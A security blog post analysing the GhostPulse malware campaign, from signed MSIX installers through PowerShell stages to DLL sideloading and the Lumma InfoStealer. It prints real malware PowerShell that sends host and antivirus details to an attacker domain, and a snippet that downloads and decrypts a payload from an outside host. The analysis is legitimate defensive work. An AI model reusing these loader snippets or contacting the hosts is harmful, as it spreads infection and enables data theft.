---
layout: post
title: Campaign Analysis - GhostPulse
date: 23-10-2024
categories: [Emerging Threats, Malware]
tag: [Malware, Emerging Threats]
---

![Banner ghostpulse](assets/images/blogs/ghostpulse/Banner-ghostpulse.png)

On the 27th October 2023, [Elastic Security Labs 2023](https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-2) followed a campaign to compromise users with signed [MSIX](https://learn.microsoft.com/en-us/windows/msix/overview) application packages to gain initial access. The campaign leverages a stealthy loader that Elastic has named GHOSTPULSE, which decrypts and loads a final payload capable of evading detection. In October 2024, [Elastic Security Labs 2024](https://www.elastic.co/security-labs/tricks-and-treats) posted an update to this campaign, where the GhostPulse loader hides inside a `.png` image using stegonography, eventually demploying itself and loading the **Lumma InfoStealer**

In this post, I will be covering this campaign from the beginning and right up to October 2024, analysing the malware samples as I go, and providing context on the technical aspects that allows these novel techniques to work.

## What is MSIX?

MSIX is a packaging format used by Microsoft, intended to be the successor to the older MSI and ClickOnce formats. It allows developers to package applications into containers for deployment on different devices. It aims to be the universal Windows application package format, and can be used for all types of Windows applications, including UWP (Universal Windows Platform), Windows Forms, Windows Presentation Foundation (WPF), and Win32.

The improtant point is that MSIX packages can be installed with a double-click, making them convinient for adversaries looking to exploit victims with *normal* seeming practises. However, However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.

In a common attack scenario, victims would be directed to download malicious MSIX packages through compromised websites, search-engine optimization (SEO) techniques, or malvertising through typosquatted domains.

The campaign will be broken down into key stages, with the 2024 evolutions of the malware discussed throughout.

## Stage 1 - The Powershell Script

The fist stage of this attack flow would involve the user getting hold of a malicious MSIX installer, such as through phishing. There are a number of MSIX installer samples for this campaign in existence, the one I cover here is different to what Elastic Security Labs covers.

Below is a Powershell script that serves as the first stage of the infection, in this infection it was called `2609_corp_user0.ps1`:

```powershell

$SS = Get-Random -Minimum 1500 -Maximum 3000
sleep -Milliseconds $SS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


$LoadDomen = "https://fresh-prok.site"



$osCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$urlEncodedOsCaption = [System.Net.WebUtility]::UrlEncode($osCaption)


$domain = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
$AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
$dis = $AV | ForEach-Object {
    $_.displayName
}
$Names = $dis -join ", "


$lnk = "$LoadDomen/?status=start&av=$Names&domain=$domain&os=$urlEncodedOsCaption"
$response = Invoke-RestMethod -Uri $lnk -Method GET
if ($response -match "404 HTTP Error") {
    Write-Host "Received 404 HTTP Error."

    exit
}
```
The Powershell script above performs a number of actions:

* Firstly, it generates a random sleep time in milliseconds between 1500 and 3000 and then waits for that duration.

* It then sets the SecurityProtocol property of the `Net.ServicePointManager` class to `Tls12`, indicating the script should communicate over a network using the `TLS` 1.2 protocol.

* It sets the `$LoadDomen` variable to the URL `"httpx[:]//fresh-prok[.]site"`.

* It retrieves information via WMI about the operating system, its domain, and installed antivirus products on the system. With this information, it will construct a URL.

* It sets the variable lnk to a URL constructed from the `$LoadDomen` variable with several query parameters, such as the status, AV, the domain, and the OS.

* It uses `Invoke-RestMethod` to send a GET request to the lnk URL and stores the HTTP response in the `$response` variable.

* It checks if the HTTP 404 error is present in the response. If it is, it writes **"Received 404 HTTP Error"** to the host process and stops the script execution.

Other Powershell scripts observed throughout this campaign have additional functionality to that covered above, I encourage you read the Elastic blogs linked above to see the additional functionality shown in the other scripts.

## Stage 2 - Libcurl.dll

In other Powershell scripts, this code addition has been in place which accounts for the download of a `.tar` or `.rar` file:

```powershell
# 1
$url = "httpx://manojsinghnegi[.]com/2[.]tar.gpg"
$outputPath = "$env:APPDATA\$xxx.gpg"
Invoke-WebRequest -Uri $url -OutFile $outputPath

# 1
echo 'putin' | .$env:APPDATA\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\$xxx.rar $env:APPDATA\$xxx.gpg

```
The file is downloaded from the domain, decrypted, and saved into `AppData`.

![Inside the tar file](assets/images/blogs/ghostpulse/inside-tar.png)


Inside the `.tar`/`.rar` file there are three items:

* `libcurl.dll`

* `handoff.wav`

* `VBoxSVC.exe` (actually a renamed and signed `gup.exe` executable that is used to update **Notepad++**, which is vulnerable to sideloading)

The file meatdata for `VBoxSVC.exe` is below:

![GUP EXE properties](assets/images/blogs/ghostpulse/gup-properties.png)